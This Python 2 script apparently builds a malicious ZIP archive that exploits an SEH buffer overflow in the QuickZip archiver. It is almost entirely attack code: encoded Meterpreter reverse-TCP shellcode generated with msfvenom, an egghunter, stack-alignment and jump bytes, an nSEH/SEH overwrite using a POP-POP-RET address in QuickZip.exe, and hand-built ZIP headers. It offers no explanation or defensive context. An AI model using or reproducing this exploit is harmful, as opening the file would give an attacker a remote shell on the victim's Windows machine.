import os

filename = "corelanboom.zip"

ldf_header = (
"\x50\x4B\x03\x04\x14\x00\x00"
"\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\xe4\x0f" # file size
"\x00\x00\x00"
)

cdf_header = (
"\x50\x4B\x01\x02\x14\x00\x14"
"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\xe4\x0f" # file size
"\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00"
)

eofcdf_header = (
"\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00" # Size of central directory (bytes)
"\x02\x10\x00\x00" # Offset of start of central directory,
# relative to start of archive
"\x00\x00"
)

final_size = 4064

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X
# LPORT=443 -e x86/alpha_upper -f c EXITFUNC=thread
shellcode = "w00tw00t"
shellcode += (
"\x89\xe3\xdb\xd1\xd9\x73\xf4\x59\x49\x49\x49\x49\x49\x43\x43"
"\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34\x41"
"\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42"
"\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50"
"\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a\x48\x4d\x52\x55\x50\x35"
"\x50\x33\x30\x55\x30\x4d\x59\x4b\x55\x30\x31\x59\x50\x55\x34"
"\x4c\x4b\x36\x30\x30\x30\x4c\x4b\x51\x42\x54\x4c\x4c\x4b\x51"
"\x42\x54\x54\x4c\x4b\x42\x52\x37\x58\x44\x4f\x58\x37\x50\x4a"
"\x57\x56\x50\x31\x4b\x4f\x4e\x4c\x57\x4c\x43\x51\x53\x4c\x55"
"\x52\x56\x4c\x31\x30\x49\x51\x48\x4f\x54\x4d\x35\x51\x38\x47"
"\x4a\x42\x4c\x32\x56\x32\x31\x47\x4c\x4b\x46\x32\x44\x50\x4c"
"\x4b\x50\x4a\x47\x4c\x4c\x4b\x50\x4c\x52\x31\x44\x38\x4a\x43"
"\x47\x38\x45\x51\x48\x51\x36\x31\x4c\x4b\x31\x49\x51\x30\x43"
"\x31\x48\x53\x4c\x4b\x51\x59\x54\x58\x4d\x33\x57\x4a\x30\x49"
"\x4c\x4b\x37\x44\x4c\x4b\x55\x51\x49\x46\x46\x51\x4b\x4f\x4e"
"\x4c\x4f\x31\x38\x4f\x44\x4d\x55\x51\x49\x57\x46\x58\x4d\x30"
"\x32\x55\x5a\x56\x55\x53\x33\x4d\x5a\x58\x47\x4b\x33\x4d\x36"
"\x44\x54\x35\x4b\x54\x31\x48\x4c\x4b\x56\x38\x36\x44\x43\x31"
"\x49\x43\x53\x56\x4c\x4b\x34\x4c\x50\x4b\x4c\x4b\x50\x58\x35"
"\x4c\x35\x51\x38\x53\x4c\x4b\x34\x44\x4c\x4b\x35\x51\x4e\x30"
"\x4b\x39\x30\x44\x36\x44\x46\x44\x31\x4b\x31\x4b\x43\x51\x56"
"\x39\x51\x4a\x56\x31\x4b\x4f\x4d\x30\x51\x4f\x51\x4f\x51\x4a"
"\x4c\x4b\x35\x42\x5a\x4b\x4c\x4d\x51\x4d\x42\x48\x56\x53\x56"
"\x52\x45\x50\x43\x30\x52\x48\x34\x37\x42\x53\x30\x32\x31\x4f"
"\x30\x54\x32\x48\x50\x4c\x33\x47\x57\x56\x55\x57\x4b\x4f\x4e"
"\x35\x48\x38\x4c\x50\x43\x31\x43\x30\x35\x50\x31\x39\x38\x44"
"\x51\x44\x46\x30\x32\x48\x47\x59\x4b\x30\x32\x4b\x35\x50\x4b"
"\x4f\x59\x45\x53\x5a\x34\x4a\x35\x38\x59\x50\x49\x38\x43\x30"
"\x44\x44\x53\x58\x53\x32\x53\x30\x55\x50\x56\x30\x4d\x59\x5a"
"\x46\x46\x30\x30\x50\x50\x50\x36\x30\x51\x50\x50\x50\x57\x30"
"\x50\x50\x35\x38\x5a\x4a\x34\x4f\x59\x4f\x4d\x30\x4b\x4f\x49"
"\x45\x4a\x37\x52\x4a\x42\x30\x51\x46\x30\x57\x42\x48\x4d\x49"
"\x4f\x55\x44\x34\x55\x31\x4b\x4f\x48\x55\x4d\x55\x59\x50\x32"
"\x54\x44\x4a\x4b\x4f\x50\x4e\x44\x48\x42\x55\x5a\x4c\x5a\x48"
"\x45\x31\x33\x30\x43\x30\x35\x50\x53\x5a\x55\x50\x52\x4a\x53"
"\x34\x50\x56\x51\x47\x55\x38\x45\x52\x39\x49\x39\x58\x51\x4f"
"\x4b\x4f\x48\x55\x4d\x53\x4a\x58\x35\x50\x43\x4e\x56\x56\x4c"
"\x4b\x37\x46\x42\x4a\x51\x50\x42\x48\x55\x50\x32\x30\x45\x50"
"\x33\x30\x46\x36\x42\x4a\x33\x30\x35\x38\x46\x38\x39\x34\x36"
"\x33\x5a\x45\x4b\x4f\x39\x45\x4d\x43\x30\x53\x43\x5a\x45\x50"
"\x51\x46\x36\x33\x56\x37\x43\x58\x44\x42\x58\x59\x38\x48\x51"
"\x4f\x4b\x4f\x39\x45\x4b\x33\x4a\x58\x33\x30\x33\x4d\x47\x52"
"\x30\x58\x53\x58\x33\x30\x47\x30\x45\x50\x43\x30\x43\x5a\x53"
"\x30\x36\x30\x52\x48\x34\x4b\x46\x4f\x44\x4f\x30\x30\x4b\x4f"
"\x59\x45\x30\x57\x45\x38\x32\x55\x32\x4e\x30\x4d\x53\x51\x4b"
"\x4f\x58\x55\x31\x4e\x51\x4e\x4b\x4f\x34\x4c\x46\x44\x5a\x49"
"\x42\x51\x4b\x4f\x4b\x4f\x4b\x4f\x35\x51\x49\x53\x37\x59\x39"
"\x56\x34\x35\x58\x47\x48\x43\x4f\x4b\x4b\x50\x55\x4d\x46\x4a"
"\x45\x5a\x42\x48\x4e\x46\x5a\x35\x4f\x4d\x4d\x4d\x4b\x4f\x4e"
"\x35\x57\x4c\x33\x36\x53\x4c\x45\x5a\x4d\x50\x4b\x4b\x4b\x50"
"\x32\x55\x44\x45\x4f\x4b\x50\x47\x54\x53\x34\x32\x42\x4f\x43"
"\x5a\x45\x50\x56\x33\x4b\x4f\x39\x45\x41\x41"
)
#./egghunter.rb -e w00t -f raw | msfvenom -a x86 --platform
# windows -p - -e x86/alpha_upper BufferRegister=ESP -f c
egghunter = (
"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x56"
"\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30"
"\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42"
"\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x42"
"\x46\x4d\x51\x39\x5a\x4b\x4f\x34\x4f\x30\x42\x30\x52\x52\x4a"
"\x43\x32\x46\x38\x58\x4d\x56\x4e\x57\x4c\x35\x55\x50\x5a\x44"
"\x34\x5a\x4f\x48\x38\x54\x37\x50\x30\x30\x30\x32\x54\x4b\x39"
"\x38\x57\x4e\x4f\x53\x45\x4b\x5a\x4e\x4f\x42\x55\x4b\x57\x4b"
"\x4f\x4d\x37\x41\x41"
)

junk2buildjmp = "A"*75 # directly points to the buildjmp code
buildjmp = ""
buildjmp += "\x61"		# POPAD
buildjmp += "\x53"		# PUSH EBX
buildjmp += "\x5c"		# POP ESP
buildjmp += "\x41\x5c"		# NOP/ALIGN + POP ESP
buildjmp += (
"\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x6e\x6e\x6e\x6e"
"\x2d\x4f\x32\x4f\x32\x2d\x43\x5f\x43\x7a\x50\x25\x4a\x4d\x4e"
"\x55\x25\x35\x32\x31\x2a\x2d\x2d\x6f\x6f\x6f\x2d\x2d\x6f\x46"
"\x46\x2d\x25\x35\x35\x49\x50"
)

rest4junk = "A" * (292 - len(
	junk2buildjmp +
	egghunter +
	buildjmp
	)
)

nSEH	= "\x74\xFF\x75\xFF" # JE 0xFF, JNE 0xFF (either way executes)
SEH 	= "\x2C\x08\x41\x00" # POP,POP,RET 0x0041082C (QuickZip.exe)
trigger	= "D"*(final_size - len(
	egghunter 		+
	junk2buildjmp 	+
	buildjmp 		+
	rest4junk 		+
	nSEH 			+
	SEH 			+
	shellcode
	)
)

payload = egghunter + junk2buildjmp + buildjmp + rest4junk + nSEH + SEH + shellcode + trigger
payload += ".txt"

print "Size: %s" % (len(payload))
print "Removing old %s file" % (filename)
os.system("del corelanboom.zip")
print "Creating new %s file" % (filename)
fd = open(filename, 'w')
fd.write(ldf_header + payload + cdf_header + payload + eofcdf_header)
fd.close()
